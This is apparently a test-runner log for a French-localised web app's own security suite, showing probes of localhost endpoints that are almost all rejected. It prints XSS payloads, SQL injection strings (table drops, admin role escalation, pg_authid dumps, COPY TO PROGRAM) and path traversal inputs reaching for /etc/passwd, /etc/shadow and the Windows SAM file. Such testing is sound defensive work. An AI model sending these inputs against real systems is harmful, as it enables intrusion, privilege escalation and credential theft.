[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:04[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m2ms[22m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation[2m > [22m[2mMulti-tenant ÔÇö API isolation[2m > [22m[2morg profile endpoint scopes data to active org only
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/organizations/profile

[2m20:26:05[22m [33m[403][39m /api/admin/organizations/profile [2m13ms[22m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/multi-tenant-isolation.test.ts [2m([22m[2m7 tests[22m[2m)[22m[33m 31607[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m org switch requires user membership in target org [33m 839[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m org profile endpoint scopes data to active org only [33m 1267[2mms[22m[39m
[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  specify custom .env file path with { path: '/custom/path/.env' }

[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Button/Button.test.ts[2m > [22m[2mui/Button[2m > [22m[2mperformance: renders 1000 buttons sequentially with acceptable time
[22m[39mÔ£ô Rendered 1000 buttons in 855.39ms

[2m20:26:16[22m [34m[types][39m Generated [2m8ms[22m
[2m20:26:19[22m [33m[302][39m / [2m3ms[22m
[2m20:26:19[22m [34m[200][39m /fr/ [2m55ms[22m
[90mstdout[2m | tests/integration/org-switch.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:26:20[22m [33m[302][39m / [2m1ms[22m
[2m20:26:20[22m [34m[200][39m /fr/ [2m40ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:26:20[22m [33m[302][39m / [2m1ms[22m
[2m20:26:21[22m [34m[200][39m /fr/ [2m37ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #1: <script>alert(1)</script>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #2: "<script>alert(1)</script>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #3: '-alert(1)-'...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #4: <img src=x onerror=alert(1)>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #5: javascript:alert(1)...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #6: ${alert(1)}...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:21[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #7: {{constructor.constructor("alert(1)")()}...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m2ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #8: <iframe src="javascript:alert(1)"></ifra...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #9: <body onload=alert(1)>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #10: <input onfocus=alert(1) autofocus>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #11: <select onfocus=alert(1) autofocus>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m2ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #12: <textarea onfocus=alert(1) autofocus>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #13: <marquee onstart=alert(1)>...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mXSS ÔÇö Blog creation endpoint[2m > [22m[2mrejects XSS payload #14: <div style="background:url(javascript:al...
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #1 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #2 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #3 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:22[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #4 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #5 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #6 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #7 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #8 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL payload #9 does not crash server
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:23[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%3B%20DROP%20TABLE%20user%3B%20--

[2m20:26:23[22m [33m[404][39m /api/admin/blog [2m50ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%20OR%20'1'%3D'1

[2m20:26:23[22m [33m[404][39m /api/admin/blog [2m45ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%3B%20DELETE%20FROM%20user%20WHERE%20'1'%3D'1'%3B%20--

[2m20:26:23[22m [33m[404][39m /api/admin/blog [2m76ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search=1'%3B%20UPDATE%20user%20SET%20role%3D'admin'%20WHERE%20'1'%3D'1

[2m20:26:23[22m [33m[404][39m /api/admin/blog [2m47ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%20UNION%20SELECT%20*%20FROM%20pg_authid%20--

[2m20:26:24[22m [33m[404][39m /api/admin/blog [2m68ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%3B%20COPY%20(SELECT%20'')%20TO%20PROGRAM%20'id'%3B%20--

[2m20:26:24[22m [33m[404][39m /api/admin/blog [2m48ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search=admin'--

[2m20:26:24[22m [33m[404][39m /api/admin/blog [2m54ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search='%20or%201%3D1--

[2m20:26:24[22m [33m[404][39m /api/admin/blog [2m31ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mSQL Injection ÔÇö API endpoints[2m > [22m[2mSQL injection in query parameters does not crash
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/blog?search=')%20OR%20('1'%3D'1

[2m20:26:24[22m [33m[404][39m /api/admin/blog [2m36ms[22m
[90mstdout[2m | tests/integration/org-switch.test.ts[2m > [22m[2mOrg switching API[2m > [22m[2mallows a user to switch active organization
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  write to custom object with { processEnv: myObject }

[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mPath Traversal ÔÇö File access prevention[2m > [22m[2mpath traversal #1 returns safe response
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/services/media?path=..%2F..%2F..%2Fetc%2Fpasswd

[2m20:26:24[22m [33m[403][39m /api/admin/services/media [2m11ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mPath Traversal ÔÇö File access prevention[2m > [22m[2mpath traversal #2 returns safe response
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/services/media?path=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam

[2m20:26:24[22m [33m[403][39m /api/admin/services/media [2m10ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mPath Traversal ÔÇö File access prevention[2m > [22m[2mpath traversal #3 returns safe response
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/services/media?path=....%2F%2F....%2F%2Fetc%2Fshadow

[2m20:26:24[22m [33m[403][39m /api/admin/services/media [2m7ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mPath Traversal ÔÇö File access prevention[2m > [22m[2mpath traversal #4 returns safe response
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/services/media?path=..%252f..%252f..%252fetc%252fpasswd

[2m20:26:24[22m [33m[403][39m /api/admin/services/media [2m8ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mPath Traversal ÔÇö File access prevention[2m > [22m[2mpath traversal #5 returns safe response
[22m[39m[apiCall]  GET http://localhost:4322/api/admin/services/media?path=..%25252f..%25252fetc%25252fpasswd

[2m20:26:25[22m [33m[403][39m /api/admin/services/media [2m8ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #1 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #2 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #3 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #4 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #5 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #6 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mCommand Injection ÔÇö Payload rejection[2m > [22m[2mcommand injection #7 does not execute
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/services/services

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/services/services [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mBuffer Overflow ÔÇö Large payload handling[2m > [22m[2mbuffer overflow #1 (10000 chars) does not crash
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mBuffer Overflow ÔÇö Large payload handling[2m > [22m[2mbuffer overflow #2 (100000 chars) does not crash
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:25[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mBuffer Overflow ÔÇö Large payload handling[2m > [22m[2mbuffer overflow #3 (1000000 chars) does not crash
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m2ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mNull Bytes ÔÇö Injection prevention[2m > [22m[2mnull byte #1 does not bypass validation
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mNull Bytes ÔÇö Injection prevention[2m > [22m[2mnull byte #2 does not bypass validation
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/integration/org-switch.test.ts[2m > [22m[2mOrg switching API[2m > [22m[2mallows a user to switch active organization
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mNull Bytes ÔÇö Injection prevention[2m > [22m[2mnull byte #3 does not bypass validation
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mUnicode Normalization ÔÇö Bypass prevention[2m > [22m[2municode normalization #1 does not bypass filters
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mUnicode Normalization ÔÇö Bypass prevention[2m > [22m[2municode normalization #2 does not bypass filters
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/integration/org-switch.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mUnicode Normalization ÔÇö Bypass prevention[2m > [22m[2municode normalization #3 does not bypass filters
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/blog

[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/admin/blog [2m1ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #1 "123" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[90mstdout[2m | tests/integration/org-switch.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/org-switch.test.ts [2m([22m[2m1 test[22m[2m)[22m[33m 22904[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m allows a user to switch active organization [33m 5974[2mms[22m[39m
[2m20:26:26[22m [33m[403][39m [33mPOST[39m /api/auth/sign-up/email [2m232ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #2 "password" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[403][39m [33mPOST[39m /api/auth/sign-up/email [2m40ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #3 "12345678" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[403][39m [33mPOST[39m /api/auth/sign-up/email [2m31ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #4 "abc123" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m35ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #5 "qwerty" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m23ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #6 "111111" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m33ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #7 "admin123" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m23ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mWeak Passwords ÔÇö Registration rejection[2m > [22m[2mweak password #8 "aaaaaa" is rejected at signup
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m26ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #1 "not-an-email" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:27[22m [34m[types][39m Generated [2m114ms[22m
[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m68ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #2 "@example.com" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m21ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #3 "user@" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m65ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #4 "user@@example.com" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m33ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #5 "user @example.com" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m18ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #6 "user@example" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m24ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #7 "" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m17ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts[2m > [22m[2mInvalid Emails ÔÇö Registration rejection[2m > [22m[2minvalid email #8 "user @example.com" is rejected
[22m[39m[apiCall]  POST http://localhost:4322/api/auth/sign-up/email

[2m20:26:28[22m [33m[429][39m [33mPOST[39m /api/auth/sign-up/email [2m17ms[22m
[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/xss-injection.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/xss-injection.test.ts [2m([22m[2m61 tests[22m[2m)[22m[33m 18391[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m SQL injection in query parameters does not crash [33m 806[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m path traversal #1 returns safe response [33m 366[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m weak password #1 "123" is rejected at signup [33m 433[2mms[22m[39m
[90mstdout[2m | tests/integration/services-admin.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:26:40[22m [33m[302][39m / [2m1ms[22m
[2m20:26:40[22m [34m[200][39m /fr/ [2m29ms[22m
[90mstdout[2m | tests/integration/services-admin.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:26:41[22m [33m[302][39m / [2m1ms[22m
[2m20:26:41[22m [34m[200][39m /fr/ [2m27ms[22m
[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/integration/services-admin.test.ts[2m > [22m[2mServices Admin tests
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒöÉ prevent building .env in docker: https://dotenvx.com/prebuild

[2m20:26:44[22m [34m[types][39m Generated [2m36ms[22m
[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mEmail Verification[2m > [22m[2mshould have email verification config
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒñû agentic secret storage: https://dotenvx.com/as2

[90mstdout[2m | tests/integration/services-admin.test.ts[2m > [22m[2mServices Admin tests
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mEmail Verification[2m > [22m[2mshould have email verification config
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/services-admin.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/services-admin.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/services-admin.test.ts [2m([22m[2m12 tests[22m[2m)[22m[33m 16625[2mms[22m[39m
[2m20:26:47[22m [34m[types][39m Generated [2m138ms[22m
[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/auth-emails.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 16152[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m should have email verification config [33m 4745[2mms[22m[39m
[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:27:01[22m [33m[302][39m / [2m1ms[22m
[2m20:27:01[22m [34m[200][39m /fr/ [2m27ms[22m
[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:27:01[22m [33m[302][39m / [2m1ms[22m
[2m20:27:01[22m [34m[200][39m /fr/ [2m24ms[22m
[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

